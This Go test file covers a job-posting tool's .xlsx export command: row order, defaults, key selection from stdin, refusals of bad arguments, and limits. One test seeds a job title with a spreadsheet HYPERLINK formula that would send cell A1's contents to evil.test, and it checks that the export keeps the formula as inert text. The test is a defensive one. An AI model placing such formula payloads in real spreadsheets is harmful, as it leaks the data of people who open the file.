package main

import (
	"archive/zip"
	"encoding/json"
	"encoding/xml"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"regexp"
	"strings"
	"testing"

	"github.com/bharathvbcr/Vani/internal/posting"
	"github.com/bharathvbcr/Vani/internal/xlsx"
)

// exportRows reads the workbook at path back as rows of cell text (empty for
// an absent cell), header first, failing on any formula.
func exportRows(t *testing.T, path string) [][]string {
	t.Helper()
	z, err := zip.OpenReader(path)
	if err != nil {
		t.Fatalf("open %s: %v", path, err)
	}
	defer z.Close()
	var data []byte
	for _, f := range z.File {
		if f.Name == "xl/worksheets/sheet1.xml" {
			rc, err := f.Open()
			if err != nil {
				t.Fatal(err)
			}
			data, err = io.ReadAll(rc)
			rc.Close()
			if err != nil {
				t.Fatal(err)
			}
		}
	}
	var ws struct {
		Rows []struct {
			Cells []struct {
				R  string  `xml:"r,attr"`
				V  string  `xml:"v"`
				F  *string `xml:"f"`
				Is struct {
					T string `xml:"t"`
				} `xml:"is"`
				T string `xml:"t,attr"`
			} `xml:"c"`
		} `xml:"sheetData>row"`
	}
	if err := xml.Unmarshal(data, &ws); err != nil {
		t.Fatalf("sheet: %v", err)
	}
	letters := regexp.MustCompile(`^[A-Z]+`)
	var out [][]string
	for _, r := range ws.Rows {
		row := make([]string, len(exportColumns))
		for _, c := range r.Cells {
			if c.F != nil {
				t.Fatalf("cell %s holds a formula", c.R)
			}
			col := letters.FindString(c.R)
			i := -1
			for k := range row {
				if xlsx.Column(k) == col {
					i = k
				}
			}
			if i < 0 {
				t.Fatalf("cell %s is outside the columns", c.R)
			}
			if c.T == "inlineStr" {
				row[i] = c.Is.T
			} else {
				row[i] = c.V
			}
		}
		out = append(out, row)
	}
	return out
}

func col(name string) int {
	for i, c := range exportColumns {
		if c.name == name {
			return i
		}
	}
	panic("no column " + name)
}

func exportJSON(t *testing.T, args ...string) jobsExportJSON {
	t.Helper()
	o, _ := mustCode(t, 0, append([]string{"jobs", "export", "--json"}, args...)...)
	var out jobsExportJSON
	if err := json.Unmarshal([]byte(o), &out); err != nil {
		t.Fatalf("export reply %q: %v", o, err)
	}
	return out
}

func seedExportJobs(t *testing.T, state string, n int) {
	t.Helper()
	var jobs []seedJob
	for i := 0; i < n; i++ {
		jobs = append(jobs, seedJob{key: fmt.Sprintf("gh:co%d:%d", i, i), title: fmt.Sprintf("Engineer %d", i),
			fit: "strong_fit", rank: fmt.Sprintf("%d", 90-i), status: posting.Digested, company: fmt.Sprintf("Co%d", i),
			url: fmt.Sprintf("https://boards.test/%d", i)})
	}
	seedJobs(t, state, jobs...)
}

// The top N rows are the list's first N, in its order, and the reply says how
// many matched in all.
func TestJobsExportTopIsTheListsTop(t *testing.T) {
	_, state := setup(t)
	seedExportJobs(t, state, 7)
	out := filepath.Join(t.TempDir(), "top.xlsx")
	r := exportJSON(t, "--top", "3", "--out", out, "--sort", "relevance")
	if r.Rows != 3 || r.Total != 7 || r.Path != out || len(r.Missing) != 0 || r.Sort != "relevance" {
		t.Fatalf("reply %+v", r)
	}
	l := listJSON(t, "--limit", "3", "--sort", "relevance")
	rows := exportRows(t, out)
	if len(rows) != 4 || rows[0][0] != "#" || rows[0][col("Pay min/yr")] != "Pay min/yr (USD)" {
		t.Fatalf("rows %v", rows)
	}
	for i, j := range l.Jobs {
		row := rows[i+1]
		if row[col("#")] != fmt.Sprint(i+1) || row[col("Key")] != string(j.Key) || row[col("Title")] != j.Title ||
			row[col("Company")] != j.Company || row[col("URL")] != j.URL || row[col("Role fit")] != "Strong fit" ||
			row[col("Status")] != "Digested" || row[col("Priority")] == "" {
			t.Errorf("row %d %v does not match list job %s", i+1, row, j.Key)
		}
	}
}

func TestJobsExportDefaults(t *testing.T) {
	_, state := setup(t)
	seedExportJobs(t, state, 2)
	r := exportJSON(t)
	if r.Rows != 2 || r.Total != 2 || r.View != "new" {
		t.Fatalf("reply %+v", r)
	}
	if filepath.Dir(r.Path) != filepath.Join(state, "export", "jobs") || !strings.HasPrefix(filepath.Base(r.Path), "jobs-new-") {
		t.Fatalf("default path %s", r.Path)
	}
	if len(exportRows(t, r.Path)) != 3 {
		t.Fatal("wrong row count")
	}
	// The same two jobs again: include says to write them anyway, and the
	// export still warns that they were exported before.
	text, stderr := mustCode(t, 0, "jobs", "export", "--already-exported", "include", "--out", filepath.Join(t.TempDir(), "x.XLSX"))
	if !strings.HasPrefix(text, "exported 2 of 2 jobs (new, default order) to ") || !strings.Contains(stderr, "2 of these 2 jobs were exported before") {
		t.Fatalf("text %q, stderr %q", text, stderr)
	}
}

// An empty selection still writes a workbook: the header row alone.
func TestJobsExportEmptySelection(t *testing.T) {
	_, state := setup(t)
	seedExportJobs(t, state, 2)
	out := filepath.Join(t.TempDir(), "none.xlsx")
	r := exportJSON(t, "--q", "no such role", "--out", out)
	if r.Rows != 0 || r.Total != 0 {
		t.Fatalf("reply %+v", r)
	}
	if rows := exportRows(t, out); len(rows) != 1 {
		t.Fatalf("rows %v", rows)
	}
}

func withKeys(t *testing.T, s string) {
	t.Helper()
	old := exportKeysInput
	t.Cleanup(func() { exportKeysInput = old })
	exportKeysInput = strings.NewReader(s)
}

// Selected jobs come out in the order given, repeats once, and a key the
// selection lacks is named, never silently dropped.
func TestJobsExportSelectedKeys(t *testing.T) {
	_, state := setup(t)
	seedExportJobs(t, state, 5)
	out := filepath.Join(t.TempDir(), "sel.xlsx")
	withKeys(t, "gh:co3:3\n\ngh:co0:0\r\ngh:co3:3\ngh:gone:9\n")
	r := exportJSON(t, "--keys-stdin", "--out", out)
	if r.Rows != 2 || r.Total != 3 || len(r.Missing) != 1 || r.Missing[0] != "gh:gone:9" {
		t.Fatalf("reply %+v", r)
	}
	rows := exportRows(t, out)
	if len(rows) != 3 || rows[1][col("Key")] != "gh:co3:3" || rows[2][col("Key")] != "gh:co0:0" || rows[2][col("#")] != "2" {
		t.Fatalf("rows %v", rows)
	}

	// Text mode writes the file too, but exits 1 and names the key.
	withKeys(t, "gh:co1:1\ngh:gone:9\n")
	out2 := filepath.Join(t.TempDir(), "sel2.xlsx")
	_, stderr := mustCode(t, 1, "jobs", "export", "--keys-stdin", "--out", out2)
	if !strings.Contains(stderr, "gh:gone:9 is not in this selection") || !strings.Contains(stderr, "1 of 2 asked-for jobs") {
		t.Fatalf("stderr %q", stderr)
	}
	if rows := exportRows(t, out2); len(rows) != 2 {
		t.Fatalf("rows %v", rows)
	}
}

// A posting no run has triaged has no scores: its cells are empty, never 0.
func TestJobsExportPendingHasNoScores(t *testing.T) {
	_, state := setup(t)
	seedJobs(t, state, seedJob{key: "gh:a:1", title: "Engineer", status: posting.Live})
	out := filepath.Join(t.TempDir(), "p.xlsx")
	if r := exportJSON(t, "--view", "pending", "--out", out); r.Rows != 1 {
		t.Fatalf("reply %+v", r)
	}
	row := exportRows(t, out)[1]
	if row[col("Priority")] != "" || row[col("Relevance")] != "" || row[col("Status")] != "Live" {
		t.Fatalf("row %v", row)
	}
}

// Posting text is untrusted: a title written as a formula stays text.
func TestJobsExportFormulaTitleStaysText(t *testing.T) {
	_, state := setup(t)
	evil := `=HYPERLINK("https://evil.test/?"&A1,"Apply")`
	seedJobs(t, state, seedJob{key: "gh:a:1", title: evil, fit: "strong_fit", status: posting.Digested})
	out := filepath.Join(t.TempDir(), "f.xlsx")
	exportJSON(t, "--out", out)
	if got := exportRows(t, out)[1][col("Title")]; got != evil {
		t.Fatalf("title %q", got)
	}
}

func TestJobsExportRefusals(t *testing.T) {
	_, state := setup(t)
	seedExportJobs(t, state, 1)
	dir := t.TempDir()
	ok := filepath.Join(dir, "ok.xlsx")
	for _, c := range []struct {
		keys string
		args []string
		code int
		want string
	}{
		{"", []string{"--top", "0"}, 2, "--top must be 1-5000"},
		{"", []string{"--top", "5001"}, 2, "--top must be 1-5000"},
		{"gh:co0:0\n", []string{"--top", "5", "--keys-stdin"}, 2, "give one"},
		{"", []string{"--out", filepath.Join(dir, "x.csv")}, 2, "must name a .xlsx file"},
		{"", []string{"--out", filepath.Join(dir, "missing", "x.xlsx")}, 1, "does not exist"},
		{"", []string{"--out", ok, "extra"}, 2, "unexpected arguments"},
		{"", []string{"--out", ok, "--view", "bogus"}, 2, "--view must be one of"},
		{"\n\n", []string{"--out", ok, "--keys-stdin"}, 2, "read no keys"},
		{"nocolon\n", []string{"--out", ok, "--keys-stdin"}, 2, "key"},
		{strings.Repeat("x", 600) + "\n", []string{"--out", ok, "--keys-stdin"}, 2, "--keys-stdin"},
	} {
		withKeys(t, c.keys)
		code, _, stderr := do(t, append([]string{"jobs", "export"}, c.args...)...)
		if code != c.code || !strings.Contains(stderr, c.want) {
			t.Errorf("%v: exit %d, stderr %q; want %d with %q", c.args, code, stderr, c.code, c.want)
		}
	}
	if _, err := os.Stat(ok); !os.IsNotExist(err) {
		t.Fatalf("a refused export wrote %s: %v", ok, err)
	}
	if _, err := os.Stat(filepath.Join(dir, "missing")); !os.IsNotExist(err) {
		t.Fatal("a mistyped --out folder was created")
	}
}

func TestJobsExportKeyCountIsBounded(t *testing.T) {
	_, state := setup(t)
	seedExportJobs(t, state, 1)
	var b strings.Builder
	for i := 0; i <= maxJobsLimit; i++ {
		fmt.Fprintf(&b, "gh:c:%d\n", i)
	}
	withKeys(t, b.String())
	code, _, stderr := do(t, "jobs", "export", "--keys-stdin", "--out", filepath.Join(t.TempDir(), "x.xlsx"))
	if code != 2 || !strings.Contains(stderr, "at most 5000 keys") {
		t.Fatalf("exit %d, stderr %q", code, stderr)
	}
}
